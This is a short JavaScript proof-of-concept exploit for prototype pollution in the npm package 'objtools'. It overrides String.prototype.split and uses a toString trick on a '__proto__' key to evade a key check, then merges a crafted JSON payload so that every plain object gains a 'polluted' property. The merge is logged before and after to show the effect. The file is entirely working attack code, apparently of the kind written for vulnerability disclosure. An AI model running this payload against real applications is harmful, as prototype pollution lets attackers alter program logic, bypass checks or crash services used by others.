var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const objtools = require('objtools');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
obj = {};
console.log({}.polluted);
objtools.merge({}, payload);
console.log({}.polluted);